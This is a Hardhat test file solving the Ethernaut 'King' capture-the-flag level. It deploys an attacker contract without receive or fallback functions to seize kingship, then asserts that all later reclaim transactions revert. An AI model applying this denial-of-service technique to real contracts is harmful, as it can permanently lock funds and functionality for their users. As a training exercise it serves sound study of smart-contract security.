import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { toWei } from "scripts/utils";
import { King, KingAttacker } from "typechain-types";

// Challenge description

// The contract below represents a very simple game:
// whoever sends it an amount of ether that is larger
// than the current prize becomes the new king.
// On such an event, the overthrown king gets paid the new prize,
// making a bit of ether in the process! As ponzi as it gets xD

// Such a fun game. Your goal is to break it.

// When you submit the instance back to the level, the level is going to reclaim kingship.
// You will beat the level if you can avoid such a self proclamation.

describe("Ethernaut - King", async () => {
  let king: King;
  let kingAttacker: KingAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    king = await ethers
      .getContractFactory("King", owner)
      .then((f) => f.deploy({ value: toWei("100") }));

    kingAttacker = await ethers
      .getContractFactory("KingAttacker", attacker)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    expect(await king.owner()).equal(owner.address);
    expect(await king._king()).equal(owner.address);
    expect(await king.prize()).equal(toWei("100"));
    expect(await ethers.provider.getBalance(king.address)).equal(toWei("100"));

    // break King contract by making KingAttacker contract (without receive and fallback) the king
    await kingAttacker
      .connect(attacker)
      .attackKing(king.address, { value: toWei("100") });

    expect(await king.owner()).equal(owner.address);
    // KingAttacker contract is the king now
    expect(await king._king()).equal(kingAttacker.address);
    expect(await king.prize()).equal(toWei("100"));
    expect(await ethers.provider.getBalance(king.address)).equal(toWei("100"));

    // nobody even owner can reclaim king status
    await expect(
      owner.sendTransaction({ to: king.address, value: toWei("100") }),
    ).reverted;
    await expect(owner.sendTransaction({ to: king.address, value: 1 }))
      .reverted;
    await expect(
      attacker.sendTransaction({ to: king.address, value: toWei("100") }),
    ).reverted;
  });
});
